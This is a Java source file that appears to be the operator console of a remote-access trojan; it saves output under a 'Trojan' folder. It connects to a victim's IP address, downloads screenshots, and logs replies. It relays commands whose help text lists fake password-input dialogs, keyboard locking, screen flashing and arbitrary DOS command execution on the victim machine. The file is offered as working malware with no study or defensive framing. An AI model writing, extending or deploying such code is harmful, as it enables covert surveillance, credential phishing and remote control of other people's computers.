package com.dsc.dci;

import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;

public class ServerSocket {
	String sep = System.getProperty("file.separator");
	String path = System.getProperty("user.dir") + sep + "Trojan"+sep;
	Socket socket;
	DataOutputStream dos;
	DataInputStream dis;
	String dosS;
	Scanner in;
	String fromClientStr;
	int picNum = 1;
	int PORT = 1220;
	String IP = "127.0.0.1";
	File file;
	BufferedWriter bw;
	String fileName;
	public static void main(String[] ag){
		new ServerSocket();
	}
	public ServerSocket() {
		while(true){
				try {
					in = new Scanner(System.in);
					System.out.print("Input IP：");
					IP = in.nextLine().trim();
					socket = new Socket(IP, PORT);
					Date date = new Date();
					SimpleDateFormat sdf = new SimpleDateFormat("MM月dd日HH时mm分_" + IP);
					fileName = sdf.format(date);
					file = new File(path + fileName);
					if(!file.exists()){
						file.mkdirs();
					}
					file = new File(path + fileName + "\\log.txt");
					try {
						bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file)));
					} catch (FileNotFoundException e) {
						e.printStackTrace();
					}
					try {
						bw.write("開始紀錄");
						bw.newLine();
						bw.flush();
					} catch (IOException e) {
						e.printStackTrace();
					}
					System.out.println("contected");
					dos = new DataOutputStream(socket.getOutputStream());
					dis = new DataInputStream(socket.getInputStream());
					new Thread(new MyInputThread()).start();
					doSomething();
				} catch (UnknownHostException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
	}
	
	class MyInputThread implements Runnable {
		public void run() {
			while (true) {
				try {
					fromClientStr = dis.readUTF();
					if (fromClientStr.equals("getPic()")) {
						getPic();
						System.out.println("Download pic is finish.");
					} else if (fromClientStr.equals("2start")) {
					} 
					else {
						showMsg(fromClientStr);
					}
				} catch (IOException e) {
					e.printStackTrace();
					break;
				}
			}
		}
	}
	public void getPic() {
		int length = 0;
		File file = new File(path + "\\" + fileName + "\\" + (picNum++)
				+ ".jpg");
		byte[] imageData = new byte[8192];
		FileOutputStream fos = null;
		int num = 0;
		try {
			fos = new FileOutputStream(file);
		} catch (FileNotFoundException e3) {
			e3.printStackTrace();
		}
		try {
			length = dis.readInt();
		} catch (IOException e2) {
			e2.printStackTrace();
		}
		while (true) {
			try {
				num = dis.read(imageData, 0, imageData.length);
				fos.write(imageData, 0, num);
				length -= num;
				if (length == 0) {
					break;
				}
			} catch (Exception e) {
				try {
					System.out.println("error");
					fos.flush();
					fos.close();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
				break;
			}
		}
		try {
			if (file != null)
				fos.close();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
	}
	public void showMsg(String msg) {
		if (msg == null) {
			return;
		}
		try {
			msg = new String(msg.getBytes("utf-8"), "utf-8");
		} catch (UnsupportedEncodingException uee) {
			uee.printStackTrace();
		}
		try {
			bw.write(msg);
			bw.flush();
			bw.newLine();
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.out.println(IP+" reply:\n"+msg.replaceFirst("null", ""));
		

	}

	public void doSomething() {// 开始发送命令
		while(true){
			System.out.println("input command:");
			dosS = in.nextLine().trim();
			if (dosS==null||dosS.equals("")) {
			}else if (dosS.equals("-r")) {
				try {
					if(socket.isConnected()){
						socket.close();
						new ServerSocket();
						break;
					}
				} catch (Exception e) {
					// TODO: handle exception
				}
			} else if (dosS.equals("exit")) {
				try {
					if(socket.isConnected()){
						socket.close();
						break;
					}
				} catch (Exception e) {
					// TODO: handle exception
				}
			} else if (dosS.endsWith("-help")) {
				System.out.println("-r 重新啟動伺服器\n exit 離開伺服器\n -p 擷取客戶端畫面");
				System.out.println("-doutmsg msg 以对话框形式输出信息\n" + "-dinmsg msg弹出一个输入对话框+显示信息msg\n"
						+ "-dinpass msg 弹出一个输入密码对话框+显示信息msg\n" + "-flash msg 闪屏并显示msg所表示的文字\n" + "-p:获取图片\n"
						+ "-m l锁定键盘 .....-m a取消锁定\n" + "输入其则执行相应的dos命令，如输入ipconfig 则显示相应的ip信息\n" + "exit:退出");
			} else {
				try {
					dos.writeUTF(dosS);
				} catch (IOException e) {
					e.printStackTrace();
				}

			}
			
		}
		
	}
}
